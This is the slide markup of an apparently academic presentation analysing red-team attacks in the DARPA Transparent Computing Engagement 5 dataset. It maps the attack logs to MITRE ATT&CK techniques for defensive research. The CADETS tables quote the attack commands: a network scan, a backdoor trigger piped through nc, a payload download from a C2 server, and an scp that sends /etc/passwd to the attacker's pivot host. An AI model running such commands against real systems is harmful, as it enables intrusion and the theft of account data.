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DA8854A-5CEE-4DB6-9554-F914725C1531}">
  <a:tblStyle styleId="{EDA8854A-5CEE-4DB6-9554-F914725C153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62f870a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62f870a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找出event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做成SP25的圖 - x-&gt;Sub,y-&gt;Obj,R 內容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62f870a9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62f870a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目標是團隊名稱，他們建構了一個系統讓Kudu去攻擊。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-TW"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-TW"/>
              <a:t>用3個LLM標TTP(Gemini Pro thinking model , GPT model, 第三個是誰)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Drakon APT在網路上沒什麼資料 主要是透過瀏覽器漏洞滲透進系統並且載入記憶體執行fileless attack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62f870a9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62f870a9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zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FiveDirections</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CADETS</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TRACE</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THEIA</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="zh-TW">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>畫攻擊機器流程圖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a62f870a9a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a62f870a9a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0e5ab9b9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0e5ab9b9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0e5ab9b9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0e5ab9b9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1e5f411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b1e5f411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ta51-pivot-1 128.55.12.149 Ubuntu 16.04 -&gt;Attacker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ta1-cadets-1 128.55.12.51 FreeBSD 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ta1-theia-target-1 128.55.12.110 Ubuntu 12.04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ta1-trace-2 128.55.12.118 Ubuntu 14.04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ta1-fivedirections-3 128.55.12.109 Windows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ta51-pivot-3 128.55.12.234 Ubuntu 18.04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3: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>將受害機器的使用者帳號清單（/etc/passwd）傳送到了紅隊的跳板機（128.55.12.149）。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62f870a9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62f870a9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62f870a9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62f870a9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62f870a9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62f870a9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b9dd992f0e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b9dd992f0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62f870a9a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62f870a9a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畫主機圖 cmdcaliper的方式做retrival -&gt; single event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0e5ab9b9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b0e5ab9b9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b0e5ab9b93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b0e5ab9b93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b1e5f4113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b1e5f4113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62f870a9a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62f870a9a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62f870a9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62f870a9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62f870a9a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62f870a9a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aae65b533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aae65b53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444746"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="E9EEF6"/>
                </a:highlight>
              </a:rPr>
              <a:t>ProLiant 是攻擊者的主機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aae65b533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aae65b533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aae65b533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aae65b533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ae65b533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ae65b533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darpa-i2o/Transparent-Computing" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/darpa-i2o/Transparent-Computing" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/darpa-i2o/Transparent-Computing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ttack.mitre.org/techniques/T1595/002/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1078/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1003/008/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1005/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1190/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1105/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1059/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1033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ttack.mitre.org/techniques/T1595/002/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1078/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1190/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1105/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1071/001/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1005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2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attack.mitre.org/techniques/T1189/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1547/006/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1068/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1055/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1036/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1574/006/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attack.mitre.org/techniques/T1189/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1105/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1574/006/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1547/006/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1068/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1055/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1036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11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image7.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/><Relationship Id="rId9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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11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u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>DARPA Transparent Computing (TC) program</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-TW" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="zh-TW" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Engagement 5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Outline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BackGround of DARPA TC E5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zh-TW">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Scenarios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Cadets(FreeBSD)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TRACE(Linux/Ubuntu)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zh-TW">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THEIA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Linux/Ubuntu)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435000" y="300100"/>
            <a:ext cx="2274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Background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攻擊者 (TA5.1): Kudu Dynamics。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目標 (TA1): FiveDirections (Windows), CADETS (FreeBSD), TRACE (Linux), THEIA (Linux/Ubuntu), ClearScope (Android), MARPLE (Windows)。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核心策略: 使用 Drakon APT 和 Micro APT，結合瀏覽器後門 (Firefox)、伺服器漏洞 (Nginx) 和 Android APK 進行滲透。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-TW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zh-TW" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>特點: 強調「記憶體內執行 (In-memory execution)」以規避偵測，並測試了多種提權 (Privilege Escalation) 和持久化 (Persistence) 技術。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Scenario</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="74" name="Google Shape;74;p16"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="329788" y="115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352500"/>
                <a:gridCol w="2330275"/>
                <a:gridCol w="4801625"/>
              </a:tblGrid>
              <a:tr h="320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目標 (Target)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被攻擊的漏洞 (Vulnerability)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實施的攻擊 (Attack Scenario)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FiveDirections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(Windows 10)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Firefox 後門、BITS 服務、Verifier 機制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透過記憶體內執行惡意程式竊取管理員憑證，並利用 Verifier 機制建立開機即執行的持久化後門。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CADETS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(FreeBSD 13)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Nginx 網頁伺服器後門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發送惡意請求觸發伺服器後門，執行遠端代碼並竊取系統帳密檔案 (/etc/passwd)。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TRACE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(Linux Ubuntu 14)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Firefox 後門、Linux 核心機制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入侵後利用核心漏洞取得 Root 權限，並將惡意代碼隱藏注入至合法的 SSH 服務行程中。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  <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>THEIA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FFFF00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(Linux Ubuntu 12)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Firefox 後門、惡意驅動程式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透過瀏覽器漏洞與惡意驅動程式提權至 Root，隨後寫入偽造的日誌檔案以混淆視聽。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8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ClearScope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(Android 8)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App 安裝權限、核心驅動漏洞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安裝偽裝 App 並利用核心漏洞取得 Root 權限，成功竊取通話紀錄、簡訊與螢幕截圖。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MARPLE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(Windows 7)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Firefox 後門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透過瀏覽器後門植入惡意程式，並嘗試使用 DNS 協定進行隱蔽的指令控制通訊。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Cadets (FreeBSD)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5486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>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>完整場景闡述 (Scenario Narrative)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攻擊者鎖定運行 FreeBSD 系統的 CADETS 主機（ta1-cadets-1 與 ta1-cadets-2），該主機運行著一個被植入後門的 Nginx 1.14.2 網頁伺服器 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初始存取 (Initial Access)： 攻擊者發送一個特製的惡意 HTTP POST 請求到目標的 Port 80。這個請求包含特定的 Magic Value，會觸發 Nginx 中的後門漏洞 。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執行 (Execution)： 後門觸發後，伺服器會執行 Payload 中的 Shellcode。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載入植入物 (Tool Loading)： Shellcode 執行後，會從攻擊者的 C2 伺服器下載並在記憶體中載入 Stage 1 Loader，隨後拉取完整的 Drakon APT 。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命令與控制 (C2)： 建立反向連線（Reverse Shell 或 HTTP C2）回傳給攻擊者 。</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1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探索與竊取 (Discovery &amp; Exfil)： 攻擊者獲得 shell 權限（uid: 80, www 使用者），執行指令確認身份，並讀取 /etc/passwd 檔案以竊取系統帳戶資訊 。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81" name="Google Shape;81;p17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5764040" y="3617880"/>
            <a:ext cx="617108" cy="832649"/>
            <a:chOff x="5234625" y="3980000"/>
            <a:chExt cx="695725" cy="938725"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="82" name="Google Shape;82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34625" y="398000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" name="Google Shape;83;p17"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252938" y="4580025"/>
              <a:ext cx="659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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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87">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Pivot 1</a:t>
              </a:r>
              <a:endParaRPr sz="1242">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="84" name="Google Shape;84;p17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5743826" y="1696454"/>
            <a:ext cx="657533" cy="917535"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="85" name="Google Shape;85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4575" y="303595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p17"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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87">
                  <a:solidFill>
                    <a:srgbClr val="0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Cadets-1</a:t>
              </a:r>
              <a:endParaRPr sz="887">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="87" name="Google Shape;87;p17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6210843" y="2590373"/>
            <a:ext cx="0" cy="10164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1105" y="3196795"/>
            <a:ext cx="177198" cy="17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1093" y="2856378"/>
            <a:ext cx="177198" cy="1771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7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7233514" y="1709678"/>
            <a:ext cx="657533" cy="917535"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="91" name="Google Shape;91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4575" y="303595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" name="Google Shape;92;p17"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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87">
                  <a:solidFill>
                    <a:srgbClr val="0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Cadets-2</a:t>
              </a:r>
              <a:endParaRPr sz="887">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="93" name="Google Shape;93;p17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5940223" y="2596891"/>
            <a:ext cx="0" cy="10365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4" name="Google Shape;94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9686" y="3027292"/>
            <a:ext cx="177198" cy="1771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" name="Google Shape;95;p17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7158732" y="3597025"/>
            <a:ext cx="807081" cy="817570"/>
            <a:chOff x="5252950" y="3997000"/>
            <a:chExt cx="909900" cy="921725"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="96" name="Google Shape;96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60037" y="399700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7"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4580025"/>
              <a:ext cx="90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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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87">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Jump Server</a:t>
              </a:r>
              <a:endParaRPr sz="1242">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="98" name="Google Shape;98;p17"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="96" idx="0"/>
            <a:endCxn id="92" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7562272" y="2627125"/>
            <a:ext cx="0" cy="9699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99" name="Google Shape;99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08395" y="3023478"/>
            <a:ext cx="177198" cy="1771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17"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="96" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="6394218" y="3905579"/>
            <a:ext cx="859500" cy="265500"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="8450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01" name="Google Shape;101;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6274256" y="4172207"/>
            <a:ext cx="10233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81075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="810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887"/>
              <a:t>RDP via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="887">
                <a:solidFill>
                  <a:srgbClr val="6AA84F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>passwd</a:t>
            </a:r>
            <a:endParaRPr sz="887">
              <a:solidFill>
                <a:srgbClr val="6AA84F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="102" name="Google Shape;102;p17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8246601" y="3586580"/>
            <a:ext cx="910594" cy="838470"/>
            <a:chOff x="5252950" y="3994375"/>
            <a:chExt cx="1026600" cy="945288"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="103" name="Google Shape;103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18400" y="3994375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" name="Google Shape;104;p17"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4600963"/>
              <a:ext cx="1026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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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87">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Attack Stage 1</a:t>
              </a:r>
              <a:endParaRPr sz="1242">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p17"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="92" idx="3"/>
            <a:endCxn id="103" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7891047" y="2477000"/>
            <a:ext cx="810900" cy="110970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06" name="Google Shape;106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409257" y="2909134"/>
            <a:ext cx="177198" cy="1771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7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="91" idx="3"/>
            <a:endCxn id="108" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7870834" y="2018232"/>
            <a:ext cx="594900" cy="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9" name="Google Shape;109;p17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8318846" y="1709612"/>
            <a:ext cx="910594" cy="838470"/>
            <a:chOff x="5252950" y="3994375"/>
            <a:chExt cx="1026600" cy="945288"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="108" name="Google Shape;108;p1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18400" y="3994375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 txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4600963"/>
              <a:ext cx="1026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075" lIns="81075" spcFirstLastPara="1" rIns="81075" wrap="square" tIns="8107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887">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Pivot 2</a:t>
              </a:r>
              <a:endParaRPr sz="1242">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="111" name="Google Shape;111;p17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072910" y="1794391"/>
            <a:ext cx="177198" cy="17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7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207766" y="2146434"/>
            <a:ext cx="177198" cy="17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7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60762" y="2145784"/>
            <a:ext cx="177198" cy="17719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17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7864269" y="2109136"/>
            <a:ext cx="594600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="84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Cadets (FreeBSD)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0" name="Google Shape;120;p18"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1486575" y="10830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966200"/>
                <a:gridCol w="2302925"/>
                <a:gridCol w="290170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行為 (Log Evidence)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98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早期偵查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nmap -sS -p 22 128.55.12.0/24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T1595.002 - Active Scanning: Vulnerability Scanning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橫向移動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 admin@128.55.12.51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T1078 - Valid Accounts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1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初始存取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 http_post_ca75 | nc 128.55.12.75 80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T1190 - Exploit Public-Facing Application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工具下載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request for /index.html?q=FX64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T1105 - Ingress Tool Transfer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執行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NEW CONSOLE READY [F1]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T1059 - Command and Scripting Interpreter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探索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F1&gt;whoami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</a:t>
                      </a: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uid: 80 www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T1033 - System Owner/User Discovery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蒐集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passwd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T1005 - Data from Local System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蒐集 (失敗)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shadow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10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T1003.008 - OS Credential Dumping: /etc/shadow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5" name="Google Shape;125;p19"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="38100" y="852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114425"/>
                <a:gridCol w="1571625"/>
                <a:gridCol w="1924050"/>
                <a:gridCol w="2647950"/>
                <a:gridCol w="180975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攻擊主機 (Source IP)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攻擊對象 (Target IP)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攻擊行為 (Log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早期偵查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N/A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128.55.12.0/24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(網段)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nmap -sS -p 22 128.55.12.0/24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rgbClr val="0B57D0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T1595.002 - Active Scanning: Vulnerability Scanning</a:t>
                      </a:r>
                      <a:endParaRPr sz="11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橫向移動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128.55.12.149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(Pivot)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128.55.12.51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(CADETS-1)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 admin@128.55.12.51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rgbClr val="0B57D0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T1078 - Valid Accounts</a:t>
                      </a:r>
                      <a:endParaRPr sz="11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初始存取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(攻擊控制節點)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128.55.12.75:80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(CADETS-2 Nginx)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 http_post_ca75 | nc 128.55.12.75 80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rgbClr val="0B57D0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T1190 - Exploit Public-Facing Application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工具下載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128.55.12.75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(CADETS-2)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98.23.182.25:80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(C2 Stage 1 Server)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request for /index.html?q=FX64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(下載 Payload)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rgbClr val="0B57D0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T1105 - Ingress Tool Transfer</a:t>
                      </a:r>
                      <a:endParaRPr sz="11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0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C2 建立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128.55.12.75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(CADETS-2)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128.55.12.233:80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(主要 OC2 Server)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NEW CONSOLE READY [F1]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(建立 C2 Session)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rgbClr val="0B57D0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T1071.001 - Application Layer Protocol: Web Protocols</a:t>
                      </a:r>
                      <a:endParaRPr sz="11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蒐集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128.55.12.233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(OC2 Server)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128.55.12.75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(CADETS-2)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passwd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 u="sng">
                          <a:solidFill>
                            <a:srgbClr val="0B57D0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T1005 - Data from Local System</a:t>
                      </a:r>
                      <a:endParaRPr sz="11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6" name="Google Shape;126;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="139927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Cadets (FreeBSD)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311700" y="1845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Scenario of Cadets</a:t>
            </a:r>
            <a:endParaRPr/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-9405125" y="-1051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247775"/>
                <a:gridCol w="1743075"/>
                <a:gridCol w="2038350"/>
              </a:tblGrid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1: 早期偵查與橫向移動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(2019/05/10)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漏洞掃描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攻擊者使用 Nmap 確認 SSH (22) 與 HTTP (80) 埠開啟。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nmap -sS -p 22 128.55.12.0/24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PORT STATE SERVICE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22/tcp open ssh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1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使用有效帳號登入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利用先前獲取的憑證，透過 SSH 登入系統。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 admin@128.55.12.51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Warning: Permanently added...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[admin@ta1-cadets-1 ~]$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資料竊取 (SCP)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 SSH 協定將敏感檔案傳回攻擊者主機。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scp passwd admin@128.55.12.149:.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passwd 100% 2696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2: Nginx 後門觸發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(2019/05/16-17)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觸發伺服器後門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發送特製 HTTP POST 請求至 Port 80。伺服器回應 403 並非拒絕存取，而是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後門觸發成功的信號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`cat http_post_ca75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3: 植入物下載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下載 Payload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受駭主機主動向 C2 發起連線，下載適用於 FreeBSD x64 的 Stage 1 程式。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request for /index.html?q=FX64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OS:F ARCH:X64 looking up "FX64"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writing 0x3D697 bytes of payload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4: C2 建立與執行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建立 C2 通道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惡意程式回連攻擊者控制台，建立互動式 Shell。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Initializing new freebsd console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NEW CONSOLE READY [F1]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5: 探索與權限確認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系統擁有者/使用者探索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確認當前 Shell 的權限層級。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F1&gt;whoami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uid: 80 www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F1&gt;hostname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ta1-cadets-2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6: 資料蒐集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讀取系統檔案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嘗試讀取帳號資訊檔。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passwd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# $FreeBSD$... root:*:0:0...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讀取受保護檔案 (失敗)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嘗試讀取密碼雜湊檔。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shadow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cat failed with status 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檔案系統探索 (失敗)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嘗試列出目錄內容。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F1&gt;ls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ls failed with status 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" name="Google Shape;133;p20"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="407700" y="939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2466950"/>
                <a:gridCol w="2006825"/>
              </a:tblGrid>
              <a:tr h="381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511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T1595.002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Active Scanning: Vulnerability Scanning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攻擊者確認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ta1-cadets-1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存活且開啟 SSH 服務。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T1078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Valid Accounts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成功以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身份登入系統。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46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T1041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Exfiltration Over C2 Channel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成功竊取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/etc/passwd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檔案。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9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T1190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Exploit Public-Facing Application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利用 Nginx 伺服器預留的漏洞，在目標系統上達成初始入侵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4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T1105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Ingress Tool Transfer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成功下載 Drakon APT 並在記憶體中載入 (Fileless)。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7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T1071.001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Application Layer Protocol: Web 